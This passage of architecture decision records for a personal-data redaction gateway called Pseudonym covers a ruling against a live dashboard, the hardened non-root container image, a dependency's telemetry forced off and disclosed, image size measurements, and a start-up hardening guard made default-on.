the per-replica trap is handled honestly. Option 4 is not recommended:
it is the only one with whole-deployment totals by itself, and it costs a
dependency, persistent state and a new failure mode, against a project
whose design avoids all three.

### Ruling (the user, 2026-10-10): option 5

The dashboard, if built, renders the committed evaluation results, not
live traffic. ADR-041 section 3's timing stands: after Phase 8, off by
default. Nothing is built by this ruling.

**The user's reasoning:**

- **The decisive argument: live counts cannot show misses.** The
  project's stated promise includes "how much Pseudonym detects is
  measured and published". A live dashboard could never show the one
  number the README is honest about, values sent as written, because
  nothing at run time knows about a value the detectors missed. It would
  fill a screen with reassuring numbers that count only what was caught.
  That is this project's central failure mode wearing a feature's
  clothes. (The argument was the assistant's, in "What is counted" above;
  the ruling rests on it.)
- **A live counter is a side channel whatever its granularity.** The
  timing finding above (watching a counter ties a type to a request whose
  time the watcher knows) means **"counts only" was never sufficient on
  its own**. **Any future live option needs access control, not just
  aggregation**: who can read the counter matters as much as what it
  counts. This holds beyond this ruling: it is a standing condition on
  any live metric this gateway might ever expose.
- **"Before and after", as ADR-041 first worded it, is ruled out as
  message content.** ADR-041 section 3 described the page as showing "a
  request before and after redaction", and in the same section limited it
  to "counts only, never message content". The two cannot both hold: a
  request before redaction is message content. **ADR-041's wording
  conflicted with its own constraint. This ruling resolves the conflict
  in favour of the constraint, rather than quietly reinterpreting the
  wording.** "Before and after" survives only in its evaluation sense:
  baselines before and after a change, and detected against sent. A
  dated note in ADR-041 section 3 points here.
- **Docker stays one service on one port.** Option 5 changes nothing in
  the Phase 8 Dockerfile or compose file, which is why this was decided
  before Phase 8 rather than after.

**Option 6, considered and not built (the user's ruling).** Each response
carrying its own request's counts in a header has real merits, stated
fairly:

- it needs no state in the gateway;
- it adds no port;
- it opens no channel between clients: each client sees only its own
  request's counts, so the counter-watching leak does not arise;
- it is genuinely useful to a client that wants confirmation the gateway
  acted on its request.

It is **a good idea left on the table for a reason of scope, not of
soundness**. Its costs, stated above (a non-OpenAI header, visible to
proxies and client logs, at per-request granularity), are a client's
own data shown back to it. **It is not to be built** under this ruling.
Building it later would be a new decision.

---

<a id="adr-046"></a>

## ADR-046: The container image (Phase 8, 2026-10-10)

**Status.** Accepted. The user set the requirements: Debian slim, not Alpine;
base pinned by digest; multi-stage; non-root; a health check that never
calls the provider; the model mounted, never baked; a CI smoke test. The
user chose the telemetry decision (item 8). Item 1's placement of `HOST`
was left to me by the user, and is decided here.

**Phase order: a deliberate choice.** Phase 8 started on 2026-10-10 with
Phase 7c still open. That is the user's choice, not a slip of rule 10.
What is left of 7c (ADR-041 section 13's option 3 and 4b) waits on section
14's three live calls, which are not made here. This work made no live
API call. The only network traffic was Docker Hub pulls (the base images)
and the npm registry, during image builds.

**Context.** The gateway had never run in a container. Its safety
properties were designed for a process on a host: a loopback default
(`HOST=127.0.0.1`), a start-up guard keyed on `NODE_ENV=production`
(ADR-016), names off unless switched on (ADR-035), a model downloaded and
hash-checked into `models/` (ADR-036). Each was checked again inside a
container, on the built image, and not assumed from the Dockerfile.

### 1. `HOST`: the loopback default does not protect a container

**Said plainly:** inside a container, `127.0.0.1` is the container's own
loopback. A gateway bound to it cannot be reached from the host or from
anywhere else, so the image must listen on `0.0.0.0`. **The loopback
default, a deliberate safety property, therefore does not protect a
containerised deployment.** What limits who can reach the gateway there is
the network in front of it: which Docker networks the container is on, and
which ports are published, and on which host interface. `docker run -p
3000:3000` publishes on every host interface by default.

**Options:**

- (a) `ENV HOST=0.0.0.0` in the Dockerfile.
- (b) In the compose file only.
- (c) The operator's job, documented.

**Decision: (a), with compose publishing on loopback.** (b) and (c) leave
the image unreachable when run on its own. That fails safe, but a
container that starts, says healthy, and serves nobody is a trap of its
own (negative control N3, below). Set in the image, the change is
declared, not silent. It shows in `docker image inspect`, the smoke test
checks it, and a comment in `env.ts` says the default protects nothing
there. Two compensations:

- `compose.yaml` publishes `127.0.0.1:3000:3000`. On the host the gateway is
  then as reachable as `npm start`'s, and the line itself says to widen it
  only with a network boundary in front.
- The README says that the container relies on the network boundary, not on
  the loopback default.

**A worse trap found beside it.** `.env.example` sets
`NODE_ENV=development` and `HOST=127.0.0.1`, as it should for development.
A `.env` made from it and passed to the container (compose `env_file`, or
`docker run --env-file .env`) makes the gateway unreachable, and **turns
the ADR-016 guard off** inside the container, silently. `compose.yaml`
sets `NODE_ENV`, `HOST` and `PORT` under `environment`, which overrides
`env_file`. This was tested with `.env.example` itself as the `.env`: the
container ran with `NODE_ENV=production` and `HOST=0.0.0.0`. **Plain
`docker run --env-file` with a development `.env` cannot be protected by
the image.** The README warns about it; whether the guard should key on
something other than `NODE_ENV` is open (consequences).

> **Superseded the same day by ADR-047** (the user's ruling). The guard now
> runs unless `PSEUDONYM_DISABLE_HARDENING=true`, so a `.env` from
> `.env.example` no longer turns it off; a test and a smoke check prove it.
> Compose still overrides `HOST`; it no longer sets `NODE_ENV`.

### 2. What goes into the image

**The build context is an allowlist.** `.dockerignore` excludes everything
(`*`), then lets back in `package.json`, `package-lock.json`,
`tsconfig.json`, `tsconfig.build.json` and `src/`. It names `.env`,
`.env.*`, `eval/`, `test/`, `docs/`, `scripts/`, `models/`, the held-out
file and the rest **again, last**. The last matching line wins, so a `!`
line added above can never let them back in. Shown, not assumed: a
throwaway build copied the context and listed it. 68 files, exactly
those five entries. The working tree beside it held `.env`,
`eval/held-out.txt` and `models/`.

**`npm run build` compiles `src/` only.** It now uses
`tsconfig.build.json`: `src/` only, `rootDir: "."` (so the output stays
`dist/src/main.js`, where `npm start` and the worker entry expect it), no
declarations and no source maps. Before, it compiled `test/`, `eval/` and
`scripts/` into `dist/` too, which nothing used. `npm run typecheck` still
covers everything.

**The runtime stage copies three things:** `package.json` (for
`"type": "module"`), production `node_modules`, and `dist/src`. Files are
owned by root. The process runs as `node`, so it cannot change its own
code.

**Proved on the built image** by `scripts/docker-smoke.ts`. A `docker
export` of a container made from the image is listed with `tar`: 13,389
paths. Checks:

- `/app` holds exactly `dist`, `node_modules` and `package.json`;
- `/app/dist` holds only `src`;
- no file named `.env` or `.env.*` anywhere in the image;
- nothing named `held-out` anywhere;
- no `eval/`, `test/`, `docs/`, `dev_docs/`, `models/`, `scripts/` or `.git`
  under `/app` (outside `node_modules`);
- five expected files are present, so an empty or wrong listing cannot pass.

`src/synthetic/` is compiled in like the rest of `src/` (the seeded
generators and the Wikidata name lists, ADR-008 and ADR-035). It holds no
personal data.

### 3. The model is optional, verified in the image

Checked on the image, not read from the code:

- names off with no model present: serves; `/health` 200;
- names on with no model mounted: refuses to start, exit 1,
  `NAME_MODEL_FILE_MISSING` (fail closed, ADR-036);
- names on with `models/` mounted read-only at `/app/models`: healthy in
  6–15 s. A synthetic name reached the stub provider only as
  `[PERSON_1]`, and came back restored (`docker-smoke.ts --models models`,
  run locally; CI has no model).

**The optional dependencies stay in the image** (the person-name runtime,
`onnxruntime-node` 301,125,480 bytes), so switching names on needs only the
mount and two settings, not another image. That size is byte-for-byte the
Debian size measured in Phase 6c with `ONNXRUNTIME_NODE_INSTALL=skip`
(ADR-036, L2), and the image contains no CUDA file. The alternative, an
`--omit=optional` image about 300 MB smaller in which names can never be
switched on, was not built.

**Not shown:** that the name model reproduces its published spans _in this
image_. L2 reproduced them on `node:22.23.3-bookworm`, the full image,
running from the repository, not on this slim image. `eval:names` was not
run inside it.

### 4. The health check

`GET /health` already existed (ADR-037). It never calls the provider, and
answers 503 only for the name model's states, so no new endpoint was
needed. The image's `HEALTHCHECK` calls it with Node's `fetch` (the slim
image has no curl).

**What it cannot show** (negative control N3): with `HOST` removed, Docker
reported the container **healthy**. The check runs inside the container,
where the loopback-bound gateway answers, while nothing outside could
reach it. A healthy container is not a serving one. That is why the smoke
test sends a real request through the published port.

### 5. The base image

`node:22.23.3-bookworm-slim@sha256:c3de60bf2f9dd0ac6370e6117950ff62d6e339527e7472301c9c78a017978392`.
The digest is the multi-platform index digest Docker Hub returned for the
tag on 2026-10-10. Pinned for the same reason the actions are pinned by
SHA and the model by hash: a floating tag would have been the only
unpinned input. One `base` stage carries the pin, and every other stage
starts from it, so the digest is written once.

**Debian, not Alpine: glibc checked by loading, not assumed.**

- `onnxruntime-node` 1.30.0 ships one Linux x64 build and no musl build.
- Its `libonnxruntime.so.1` names `ld-linux-x86-64.so.2`, `libc.so.6` and
  `libstdc++.so.6`, and needs glibc symbol versions up to `GLIBC_2.28`.
- Loading the binding on `node:22.23.3-alpine` (with `libstdc++` added, so
  only the C library differs) fails: `Error loading shared library
ld-linux-x86-64.so.2: No such file or directory`. On
  `node:22.23.3-bookworm-slim` it loads.
- `@huggingface/tokenizers` is plain JavaScript.
- Bookworm (glibc 2.36) is also the distribution on which L2 reproduced the
  name model's spans.

**Bump procedure:** pull the new tag, record its digest here, rebuild, and
run the smoke test. A base change moves glibc and libstdc++ under the name
runtime: say the spans are reproduced only after `eval:names` has shown
it in the new image.

### 6. The start-up guard survives

The image sets `NODE_ENV=production`, so the guard runs, and the command is
`node --disable-sigusr1 dist/src/main.js`. (Since ADR-047, later the same
day, the image sets no `NODE_ENV`: the guard runs unless
`PSEUDONYM_DISABLE_HARDENING=true`.) The core dump limit cannot be set
from a Dockerfile. It stays the operator's: `docker run --ulimit core=0`,
or `ulimits: core: 0` in compose, which sets soft and hard to 0.
Measured: Docker Desktop's default is soft 0, hard unlimited. Docker Engine
on Linux can pass the daemon's own limit through (not measured here), so
the image must not count on a zero.

**Shown in the image**, by the smoke test on every CI run. With
`PSEUDONYM_MODEL` set and nothing else wrong, the guard refuses, exit 1,
with its own message:

- with `--ulimit core=1024`;
- with `NODE_OPTIONS=--inspect`;
- when started as `node dist/src/main.js`, without `--disable-sigusr1`.

Each run is limited to 60 s (bug-log 72).

On Docker Desktop the guard also prints its host warning. The VM pipes core
dumps to a crash handler, which is the host-side case ADR-016 can only warn
about.

### 7. Non-root, and the hardened run

`USER node` (uid 1000). The smoke test checks the configured user, then
the running process. It finds the process whose argv is `node … dist/src/main.js`
(not PID 1, which is Docker's init), and checks that its real and effective
uid are both non-zero.

The smoke test runs the gateway the way the README recommends:

- `--init`;
- `--ulimit core=0`;
- `--read-only`;
- `--cap-drop ALL`;
- `--security-opt no-new-privileges`;
- the port published on `127.0.0.1`.

`compose.yaml` carries the same flags. `init` is there because Node as
PID 1 has no SIGTERM handler, and the kernel ignores signals without one
for PID 1. Without it, `docker stop` waits 10 s and kills the process.

### 8. ONNX Runtime's telemetry (found here; the user's decision)

**Found** in the first names-on start in the image, which logged: "No
readable CA bundle was found; telemetry HTTPS uploads will be unavailable".

ONNX Runtime 1.30's Linux build contains Microsoft's 1DS telemetry
client, **on by default**. Its source at v1.30.0
(`core/platform/posix/telemetry.cc`, `core/platform/telemetry_environment.h`,
`core/platform/posix/device_id.cc`) shows:

- **Where it sends:** `https://mobile.events.data.microsoft.com/OneCollector/1.0`.
- **What it sends:** the CPU model, OS, memory, a hashed device ID, and
  per session the model's file name, hashes, metadata and execution
  providers. Request text is not among the fields read.
- **What it keeps on disk:** unsent events and the device ID, under
  `~/.cache`.
- **When it is off:** when `ORT_DISABLE_TELEMETRY` is `1`, `true`, `yes`,
  `on` or `y`, and when any of 13 CI variables is set (`CI` and
  `GITHUB_ACTIONS` among them).

**In this image, before the fix:** no upload was possible, only because
the slim image has no CA bundle. That is an accident, not a control: one
`apt-get install ca-certificates` would have enabled it. It still wrote
`deviceid` and a 45 KB event queue to
`/home/node/.cache/Microsoft/DeveloperTools/.onnxruntime/`.

**Decision (the user): forced off in code.**

- `WorkerNameModel.start` calls `disableRuntimeTelemetry()`, which sets
  `ORT_DISABLE_TELEMETRY=1` on the main thread before any name thread
  starts. Main thread, because the runtime reads the process environment
  from native code, and only a main-thread assignment to `process.env`
  changes it.
- It overrides whatever the environment held, so an operator cannot turn
  telemetry back on.
- The Dockerfile declares `ORT_DISABLE_TELEMETRY=1` as well, so that the
  image says so.

**Shown:**

- In the image, names on, model mounted, `-e ORT_DISABLE_TELEMETRY=0`
  overriding the image's `ENV`: the container's environment said `0`, yet
  no telemetry line was logged and nothing was written under `~/.cache`.
- The control is the image built before the switch, which wrote both
  files.
- Unit tests: the setter overrides `0`, and a stand-in thread started with
  `0` in the environment sees `1`. Mutations OT1–OT3
  (`scripts/mutations/runtime-telemetry.ts`) are 3 of 3 caught.

**Exposure before this, as far as it can be known:**

- The GitHub runner runs (CI, Names) set `CI`/`GITHUB_ACTIONS`, so
  telemetry was off there.
- The Phase 6c L2 run used `node:22.23.3-bookworm`, which has a CA bundle,
  set no CI variable and ran names. It **probably uploaded** that
  session's events (CPU model, device ID, model file name and hashes).
  This was not checked, and cannot be now.
- Windows uses a different telemetry path (`core/platform/windows`), which
  was not examined.
- `scripts/compare-names.ts` loads the runtime in-process, not through the
  worker, so the switch does not cover it. It is a 6a measurement script,
  not the gateway.

### 9. Size

The image is **794,001,759 bytes**, as Docker Desktop reports it (`docker
image inspect` `.Size`), built from this change's final tree on 2026-10-10.

> **Corrected 2026-10-10 (bug-log 74).** This first said `.Size` was "the
> unpacked size in its image store". It is not. Docker 29's containerd image
> store reports "disk usage": the unpacked layers **plus** the compressed
> copy it keeps. The image is 593,768,448 bytes unpacked and 200,233,311
> compressed (what a pull downloads). The amendment at the end of this ADR
> has the measurements and the single-image decision. The table below
> measures directories, and stands.

| Part                        | Bytes       |
| --------------------------- | ----------- |
| The base image              | 326,104,305 |
| `/app/node_modules`         | 331,758,071 |
| of which `onnxruntime-node` | 301,125,480 |
| `/app/dist`                 | 389,694     |

"The base image" row is Docker Desktop's disk usage too (246,292,480
unpacked). The compressed (pulled) size was not measured at first; see the
amendment. CI prints the size on its runner.

### Negative controls (the smoke test can fail)

Five broken images, each built from a one-line change to the Dockerfile;
the commands are in the testing guide. All five were run against the final
script:

| Control | The change                                         | Failed checks |
| ------- | -------------------------------------------------- | ------------- |
| N1      | `eval/held-out.txt` and `.env` planted in `/app`   | 4             |
| N2      | no `USER` line                                     | 2             |
| N3      | no `HOST=0.0.0.0` (Docker still said healthy)      | 6             |
| N4      | `NODE_ENV=development` (the guard checks time out) | 4             |
| N5      | `CMD` without `--disable-sigusr1`                  | 9             |

### Consequences and open points

- The gateway's reachability in a container is the operator's network
  configuration. The README says so.
- **Open, for the user:** a development `.env` passed with `docker run
--env-file` turns the guard off. Compose is protected; plain
  `docker run` is not. The guard keys only on `NODE_ENV`. **Resolved the
  same day by ADR-047** (the user's ruling): the guard is on unless
  `PSEUDONYM_DISABLE_HARDENING=true`.
- npm and yarn from the base image remain in the runtime image; nothing
  runs them.
- Only linux/amd64 was built and tested. The base digest covers arm64,
  but this image was not built or tested there.
- CI does not run the names-on smoke test (no model in `ci.yml`).
  **Changed the same day:** it does now (amendment below).
- The README status line is unchanged in substance. Phase 7 is not done,
  so "Phase 6 of 8 done" stays, with the image added beside it.

### Amendment (2026-10-10, later the same day): telemetry on Windows, the size decision, names on in CI

The user asked for four things after 97e244e: the telemetry finding made a
disclosed threat-model item, the question of Windows answered, the image
size examined and decided, and the names-on smoke run moved into CI. The
guard ruling is ADR-047. No live API call was made.

**A. Windows: affected, and not covered by the code switch.** Item 8 said
"by default on Linux". Every local names run since Phase 6a was on Windows
(6a, the 6b moves, `eval:names`, `test:names`). How it was checked:

- **The installed Windows build**
  (`onnxruntime-node/bin/napi-v6/win32/x64/onnxruntime.dll`), searched in
  both ASCII and UTF-16:
  - it contains the ETW provider name `Microsoft.ML.ONNXRuntime` and the
    events `ProcessInfo`, `SessionCreation` and `modelGraphHash`;
  - it contains `ORT_RUNNING_UNIT_TESTS`;
  - it does **not** contain `ORT_DISABLE_TELEMETRY`, `GITHUB_ACTIONS`, or
    any 1DS collector address.
- **The source at v1.30.0** (`core/platform/windows/telemetry.cc`):
  - the provider is defined with `TraceLoggingOptionMicrosoftTelemetry()`;
  - it is on by default (`enabled_ = true`);
  - events carry `MICROSOFT_KEYWORD_MEASURES`, with the same fields as on
    Linux (`cpuModel`, `modelFileName`, model hashes, metadata);
  - the only automatic off switch is the unit-test check;
  - no environment variable is read.
- **ONNX Runtime's own `docs/Privacy.md`** says Windows events "may be
  periodically sent to Microsoft servers" by the operating system, "based
  on user consent". It also lists `ORT_DISABLE_TELEMETRY=1` as an off
  switch, which this Windows build does not read.
- **The Node binding** (`js/node/src/ort_singleton_data.cc` at v1.30.0)
  creates its environment with no telemetry call, and exposes no
  `DisableTelemetryEvents`. The compiled binding has no "telemetry" string
  either.
- **This machine:** diagnostic data `AllowTelemetry=0`, which Windows Home
  treats as Required (`MaxTelemetryAllowed=1`); the DiagTrack service is
  running.
- **Not observed.** Watching the provider needs an ETW trace session, which
  needs an elevated shell. This session was not elevated, and that was not
  worked around. The testing guide has the commands for the user.

**So on Windows:** the runtime emits these events into Windows' own
diagnostic pipeline by default. Pseudonym cannot turn that off: the
variable is not read there, and the binding offers no API. Whether Windows
uploads them depends on its diagnostic-data level, and for this machine
that is not established.

`ORT_RUNNING_UNIT_TESTS=1` would turn it off. But the source calls it "an
internal harness signal, not a user-facing opt-out", so it is not used.
**The user's decision: disclose as a gap.** Production is Linux (ADR-016),
where the code switch works.

**B. The image size, decided: one image (the user's decision).**

- **The runtime is loaded lazily, so a names-free image is possible.**
  Only `src/gateway/name-worker-entry.ts` requires `onnxruntime-node` and
  `@huggingface/tokenizers`. That thread starts only with names on, and
  `main.ts` imports the name modules dynamically, only then.
- **Shown by a probe image** built with `npm ci --omit=dev --omit=optional`
  (not committed):
  - names off: it served;
  - names on, with the model mounted: it refused,
    `NAME_MODEL_LOAD_FAILED`.

Measured on 2026-10-10. "Unpacked" is the sum of `docker history`'s layer
sizes. "Compressed" is disk usage minus unpacked, which `docker image ls`
shows rounded as "content size" (200 MB and 85.3 MB). It was checked
against a separate measure, the size of the `docker save` archive:
200,253,440 and 85,339,648 bytes, the compressed layers plus tar framing.

| Image                     | Unpacked    | Compressed (a pull) | Disk usage (Docker Desktop) |
| ------------------------- | ----------- | ------------------- | --------------------------- |
| Single image (as shipped) | 593,772,544 | 200,233,821         | 794,006,365                 |
| Without the name runtime  | 289,304,576 | 85,319,612          | 374,624,188                 |
| The base image            | 246,292,480 | (not measured)      | 326,104,305                 |

The name runtime costs about **304 MB unpacked and 115 MB per pull**, in
every deployment, including the names-off default, which never loads it.
The probe was built from the Dockerfile before ADR-047 removed `NODE_ENV`
from it; that changes no layer's size.

**Decision: a single image, deliberately.** One artifact to smoke-test,
and names switched on by a mount and a setting. That is the property the
user asked for in question 3 of ADR-046.

- **The cost, recorded:** the size above.
- **A runtime that is never loaded with names off:** about 300 MB of native
  code, its telemetry client included, sits on disk in every container.
  Code that is never loaded runs nothing.
- **Considered and not built:** a slim default plus a names tag, or slim
  only. A later decision can add either with a build argument; the probe
  shows it works.

**C. Names on in CI (the user's decision: the main CI `docker` job).**

- The job restores the model from the Names workflow's cache, under the
  same key (`name-model-<hash of name-model.ts>`). It only restores; Names
  is the one job that saves it.
- It runs `npm run fetch:model`, which checks every file and downloads on a
  miss, and then `docker-smoke.ts --models models` on every push.
- **Why there and not in Names:** a change that breaks names in the image
  (the worker's path, a missing runtime, the C library) is caught on the
  push that makes it, not up to a day later and only on `main`.
- **ADR-036's per-CPU stopping rule does not govern it:** it checks that a
  name is redacted, not that spans equal a baseline.
- **Cost:** about a minute, and a download from Hugging Face whenever the
  cache is cold. The daily Names run keeps it warm on `main`. If Hugging
  Face is down on a cold cache, the job fails; it never passes without the
  check.
- **Not yet run on GitHub.** Only ran locally, where the smoke test passed
  38 of 38 checks.

### Amendment D (2026-10-10, after 38478cf): the disclosure's shape, and the gap shown at start-up

The user's two additions. No live API call was made.

**1. The bounding fact, stated beside the gap.** The shipped artifact is the
Linux container. There, telemetry is forced off and proven off by a
negative control (item 8). **The exposure is the development environment,
not the product.** The README threat model and the user manual now say
this first, so that no reader concludes Pseudonym ships with telemetry.

The disclosure is split into two entries, which are not alike:

- **Linux: a bug, fixed.** On by default, now forced off in code
  (`disableRuntimeTelemetry`), proven by the negative control.
- **Windows: a platform limitation, permanent at ONNX Runtime 1.30.0,** and
  not fixable from the Node binding. The Windows build does not read
  `ORT_DISABLE_TELEMETRY`, and the binding does not expose
  `DisableTelemetryEvents` (amendment A).

**An operator's options on Windows.** The user named two: run the
container, or use Windows' own diagnostic-data setting. There is a third,
recorded because it is true: keep names off, and the runtime is never
loaded (amendment B). For the setting, whether Windows Home's lowest
available level (Required) leaves these events out is not established.

**2. The gap shown where it happens.** With names on, `main.ts` prints one
line at start-up from `runtimeTelemetryNotice(process.platform)`
(`name-worker.ts`):

> names warning: ONNX Runtime's telemetry cannot be turned off on Windows;
> see the README's threat model, "Disclosed: a dependency's telemetry"

It prints only on `win32`, and only when names are on (inside
`nameFinder`'s callback). The user gave the reasoning: the same as
withholding an unbaselined CPU's results, and as counting dropped
`extra_content`. A known gap should be visible at the moment it applies.

**Not on Linux, where it is untrue.** It is not printed on macOS either.
The macOS arm64 build of `onnxruntime-node` 1.30.0 contains
`ORT_DISABLE_TELEMETRY` and the same 1DS client as Linux, so the switch
should apply there. That is inferred from the binary; no Mac was run.

Shown:

- **Unit tests:**
  - the exact line on `win32`, one line long;
  - nothing on `linux` or `darwin`;
  - the README title it points at exists.
- **Mutations OT4–OT6** (`scripts/mutations/runtime-telemetry.ts`): never
  printed, printed everywhere but Linux, printed everywhere. 3 of 3 caught,
  and OT1–OT3 still caught.
- **The built gateway on this Windows machine:** the line appeared with
  names on, and not with names off.
- **In the image** (`docker-smoke.ts --models`):
  - names on does not print it, a new check (39 checks with `--models`);
  - negative control N7, the compiled check changed to `linux` in the
    image, fails exactly that check.

**Evidence status, recorded with the finding.** The Windows finding
**rests on inference**: the DLL registers the provider, and the source says
it is on by default.

- **No telemetry event has been observed firing on Windows.**
- The check that would observe it, the elevated `logman` trace in the
  testing guide, needs an elevated shell. **It is the user's to run.**
- Until the user runs it, the Windows entry is marked **unobserved** in the
  README, the user manual and here.

Linux is not in the same position: there the runtime's on-disk queue and
device ID were observed, and the fix removed them. An upload itself was not
observed on Linux either; the image has no CA bundle.

---

<a id="adr-047"></a>

## ADR-047: The start-up guard is on unless turned off by name (2026-10-10; the user's ruling)

**Status.** Accepted: the user's ruling. It amends ADR-016, whose checks
are unchanged; what changes is when they run. The variable's name was
chosen by the user from three options.

**Context.** Since ADR-016, `main.ts` ran the start-up guard only when
`NODE_ENV=production`. ADR-046 found what that does in a container:

- `.env.example` sets `NODE_ENV=development`, as development templates
  do.
- A `.env` made from it and passed with `docker run --env-file` overrides
  the image's `ENV`.
- The guard was then off inside the container. Dumps, the debugger and
  diagnostic reports went unchecked, and nothing said so.

**The ruling: invert it.** Hardening is **on** unless an explicitly named
variable turns it off. It is never inferred from `NODE_ENV`.

**The reasoning, as the user gave it:**

- `--env-file` overrides a Dockerfile `ENV`, so **the image cannot defend
  itself; only the code can.**
- Keying safety off a variable that every development template sets to
  "development" **makes the unsafe state the silent default.**
- **The cost:** developers who relied on `NODE_ENV=development` must set
  the named flag once. **That cost is worth paying for a default that
  fails safe.**

**Decision.**

- **`PSEUDONYM_DISABLE_HARDENING`**: `true` turns the guard off; `false`
  or unset leaves it on.
- **Any other value is an environment error**, so `TRUE`, `1` or a typo
  refuses to start rather than turning the guard off.
- **`startupHardening(env, input)`** (`src/hardening.ts`) is the decision
  `main.ts` now runs. It returns the guard's result, or `undefined` when
  turned off by name.
- **When off, `main.ts` says so on every start:** "hardening off:
  PSEUDONYM_DISABLE_HARDENING=true; dumps and the debugger are not
  checked".
- **`NODE_ENV` is still validated, and switches nothing.** The image no
  longer sets it, and compose no longer overrides it.
- **`.env.example`** keeps `NODE_ENV=development` and documents the flag
  commented out, so a `.env` copied from it never disables the guard.

**Who pays the cost.**

- **On Windows and macOS:** nothing changes in practice. The guard only
  warns there unless a forbidden flag is set, so `npm run dev` now prints a
  warning on every start.
- **On Linux:** `npm run dev` passes no `--disable-sigusr1`, and most hosts
  allow core dumps, so it now refuses until the developer sets
  `PSEUDONYM_DISABLE_HARDENING=true` in their own `.env`. `.env.example`
  says exactly that.
- **Tests and `eval:names`:** unaffected. They build the server directly
  and never run `main.ts`.

**Proof.**

- **Unit tests** (`test/unit/hardening.test.ts`):
  - `.env.example` is parsed with `node:util`'s `parseEnv`, the parser
    behind `--env-file`, then loaded; on an unsafe Linux input the guard
    refuses (**the exact case ADR-046 found**);
  - `NODE_ENV` set to `development`, `test` or `production` changes nothing;
  - `false` keeps the guard on, and only `true` turns it off;
  - `TRUE` and `1` are rejected (`env.test.ts`).
- **Mutations G1–G4** (`scripts/mutations/hardening-default.ts`) are 4 of 4
  caught. G1 puts the old `NODE_ENV` rule back, and the `.env.example` test
  is among the 5 tests that catch it.
- **In the image** (`docker-smoke.ts`):
  - with `docker run --env-file .env.example --ulimit core=1024`, the guard
    refuses;
  - the image must not set the flag;
  - negative control N4 (the flag baked into the image) fails 5 checks;
  - N6, an image with `NODE_ENV=development`, now passes all 30.

**Consequences.**

- An operator who wants the guard off must say so by name, and is told on
  every start.
- A Linux development `.env` with the flag set, passed to a container,
  still turns the guard off there. That is now an explicit act in a file
  the operator wrote, not a template's default. The README says never to
  give such a file to a container.
- Compose does not pin the flag to `false`: that would override an
  explicitly named choice, which this ruling makes the one way to turn the
  guard off.
